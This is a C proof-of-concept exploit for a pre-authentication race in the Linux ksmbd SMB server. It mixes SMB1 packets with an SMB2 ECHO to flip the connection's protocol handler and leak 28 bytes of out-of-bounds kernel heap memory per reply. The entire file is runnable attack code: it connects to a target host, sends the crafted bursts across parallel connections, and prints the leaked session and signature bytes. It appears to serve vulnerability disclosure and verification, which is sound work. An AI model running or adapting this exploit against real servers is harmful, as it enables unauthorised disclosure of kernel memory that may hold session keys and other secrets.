/*
 * opsflip.c -- ZDI-CAN-33774 proof of concept
 * ksmbd protocol dispatch race: OOB heap read via SMB1/SMB2 ops confusion
 *
 * Author: al4n4n (Dadb0d)
 *
 * The connection thread selects conn->ops per-PDU at enqueue time, but
 * kworkers dereference conn->ops at dequeue time. A burst of short SMB1
 * PDUs followed by one SMB2 ECHO in a single write(2) flips conn->ops
 * from the SMB1 to the SMB2 vector while the SMB1 works are still queued.
 * init_smb2_rsp_hdr() then reads 28 bytes past the 40-byte SMB1 buffer
 * and sends them back in a 77-byte SMB2 error reply.
 *
 * Pre-auth: only a guest share is needed (no real credentials).
 * Oracle:   any 77-byte reply on the wire == leaked heap bytes.
 * KASAN:    slab-out-of-bounds READ in init_smb2_rsp_hdr, kmalloc-64.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <poll.h>
#include <signal.h>

#define SMB2_HDR_SIZE  64
#define SMB2_PROTO     "\xfeSMB"
#define SMB1_PROTO     "\xffSMB"
#define SMB2_ECHO      0x000d
#define ST_USER_SESSION_DELETED 0xC0000203u

static void put16(uint8_t *p, uint16_t v) { p[0] = v; p[1] = v >> 8; }
static void put32(uint8_t *p, uint32_t v) {
    p[0] = v; p[1] = v >> 8; p[2] = v >> 16; p[3] = v >> 24;
}
static uint16_t get16(const uint8_t *p) { return p[0] | (p[1] << 8); }
static uint32_t get32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}
static uint64_t get64(const uint8_t *p) {
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--) v = (v << 8) | p[i];
    return v;
}

static int connect_to(const char *host, int port) {
    struct sockaddr_in sa;
    int one = 1, s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) { close(s); return -1; }
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
    return s;
}

/* Short SMB1 PDU: 35 bytes -> 40-byte kmalloc in kmalloc-64 */
static int build_smb1(uint8_t *p, uint32_t len, uint32_t tag) {
    memset(p, 0, len);
    memcpy(p, SMB1_PROTO, 4);
    p[4] = 0x00;           /* Command 0x00: -EINVAL, no credit taken */
    put16(p + 12, 2);      /* PidHigh -> smb2_hdr.Command = LOGOFF */
    if (len > 27) put32(p + 24, tag);
    return (int)len;
}

/* 68-byte SMB2 ECHO: flips conn->ops to SMB2 vector */
static int build_echo(uint8_t *p, uint64_t msgid) {
    memset(p, 0, SMB2_HDR_SIZE + 4);
    memcpy(p, SMB2_PROTO, 4);
    put16(p + 4, SMB2_HDR_SIZE);
    put16(p + 12, SMB2_ECHO);
    put16(p + 14, 512);    /* CreditRequest */
    put32(p + 24, (uint32_t)msgid);
    put16(p + SMB2_HDR_SIZE, 4);
    return SMB2_HDR_SIZE + 4;
}

static size_t frame(uint8_t *out, const uint8_t *pdu, uint32_t len) {
    out[0] = 0; out[1] = (len >> 16) & 0xff;
    out[2] = (len >> 8) & 0xff; out[3] = len & 0xff;
    memcpy(out + 4, pdu, len);
    return len + 4;
}

struct stats {
    unsigned long sent, replies, leaks, nonzero;
    unsigned long samples;
};

static void drain(int s, struct stats *st, const char *mode, int verbose, int tmo) {
    static uint8_t rx[1 << 16];
    static size_t have;
    struct pollfd pfd = { .fd = s, .events = POLLIN };

    for (;;) {
        size_t off = 0;
        ssize_t n;
        if (have == sizeof(rx)) have = 0;
        if (poll(&pfd, 1, tmo) <= 0) return;
        n = recv(s, rx + have, sizeof(rx) - have, MSG_DONTWAIT);
        if (n <= 0) return;
        have += (size_t)n;

        while (have - off >= 4) {
            uint32_t plen = ((uint32_t)rx[off+1] << 16) |
                            ((uint32_t)rx[off+2] << 8) | rx[off+3];
            const uint8_t *m = rx + off + 4;
            if (have - off < plen + 4) break;
            st->replies++;

            if (plen >= SMB2_HDR_SIZE &&
                get32(m + 8) == ST_USER_SESSION_DELETED) {
                int nz = 0;
                for (int i = 40; i < 64; i++)
                    if (m[i]) nz = 1;
                st->leaks++;
                if (nz) st->nonzero++;

                if (st->samples < 8 && (nz || st->samples < 2)) {
                    st->samples++;
                    printf("OPSFLIP:%s:LEAK mid=%08x sess=%016llx sig=",
                           mode, get32(m + 24),
                           (unsigned long long)get64(m + 40));
                    for (int i = 48; i < 64; i++) printf("%02x", m[i]);
                    printf(" raw=");
                    for (int i = 36; i < 64; i++) printf("%02x", m[i]);
                    printf("\n");
                }
                if (verbose) {
                    printf("OPSFLIP:LEAK:bytes=");
                    for (int i = 36; i < 64; i++) printf("%02x", m[i]);
                    printf("\n");
                }
            }
            off += plen + 4;
        }
        if (off) { memmove(rx, rx + off, have - off); have -= off; }
    }
}

static int run_child(const char *host, int port, uint32_t iters,
                     uint32_t burst, uint32_t smb1_len, const char *mode,
                     int verbose, int child_id) {
    uint8_t one[4096];
    static uint8_t buf[1 << 20];
    struct stats st = {0};
    int s = connect_to(host, port);
    if (s < 0) { fprintf(stderr, "connect failed: %s\n", strerror(errno)); return 2; }

    for (uint32_t i = 0; i < iters; i++) {
        size_t len = 0;
        for (uint32_t j = 0; j < burst; j++) {
            build_smb1(one, smb1_len, i * burst + j);
            if (len + smb1_len + 4 > sizeof(buf)) break;
            len += frame(buf + len, one, smb1_len);
            st.sent++;
        }
        int el = build_echo(one, i);
        len += frame(buf + len, one, (uint32_t)el);

        if (write(s, buf, len) != (ssize_t)len) break;
        drain(s, &st, mode, verbose, (i % 64) ? 0 : 20);
    }
    drain(s, &st, mode, verbose, 2000);
    drain(s, &st, mode, verbose, 2000);
    close(s);

    printf("OPSFLIP:%s:child=%d sent=%lu replies=%lu LEAKS=%lu nonzero=%lu\n",
           mode, child_id, st.sent, st.replies, st.leaks, st.nonzero);
    return 0;
}

static void usage(const char *me) {
    fprintf(stderr,
        "Usage: %s -h <host> [-p port] [-C conns] [-I iters] [-B burst] [-S len] [-m mode] [-v]\n"
        "\n"
        "  -h HOST   target IPv4 (required)\n"
        "  -p PORT   target port (default 445)\n"
        "  -C CONNS  parallel connections (default 4)\n"
        "  -I ITERS  bursts per connection (default 2000)\n"
        "  -B BURST  SMB1 PDUs per burst before the ECHO (default 64)\n"
        "  -S LEN    SMB1 PDU length: 35=exploit (40B alloc), 64=control (default 35)\n"
        "  -m MODE   'exploit' or 'control' (default exploit)\n"
        "  -v        verbose: print every leaked window\n"
        "\n"
        "Modes:\n"
        "  exploit  -S 35: 40-byte alloc in kmalloc-64, reads 28 bytes OOB\n"
        "  control  -S 64: 69-byte alloc fills kmalloc-64 exactly, no OOB\n", me);
}

int main(int argc, char **argv) {
    const char *host = NULL, *mode = "exploit";
    int port = 445, verbose = 0, c;
    uint32_t conns = 4, iters = 2000, burst = 64, smb1_len = 0;

    while ((c = getopt(argc, argv, "h:p:C:I:B:S:m:v")) != -1) {
        switch (c) {
        case 'h': host = optarg; break;
        case 'p': port = atoi(optarg); break;
        case 'C': conns = strtoul(optarg, NULL, 0); break;
        case 'I': iters = strtoul(optarg, NULL, 0); break;
        case 'B': burst = strtoul(optarg, NULL, 0); break;
        case 'S': smb1_len = strtoul(optarg, NULL, 0); break;
        case 'm': mode = optarg; break;
        case 'v': verbose = 1; break;
        default: usage(argv[0]); return 2;
        }
    }
    if (!host) { usage(argv[0]); return 2; }

    if (!smb1_len)
        smb1_len = strcmp(mode, "control") == 0 ? 64 : 35;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("OPSFLIP: target=%s:%d mode=%s conns=%u iters=%u burst=%u smb1_len=%u alloc=%u\n",
           host, port, mode, conns, iters, burst, smb1_len, smb1_len + 5);

    for (uint32_t i = 0; i < conns; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            int r = run_child(host, port, iters, burst, smb1_len, mode, verbose, (int)i);
            _exit(r);
        } else if (pid < 0) {
            fprintf(stderr, "fork: %s\n", strerror(errno));
            break;
        }
    }
    while (wait(NULL) > 0);
    printf("OPSFLIP: RUN-COMPLETE\n");
    return 0;
}
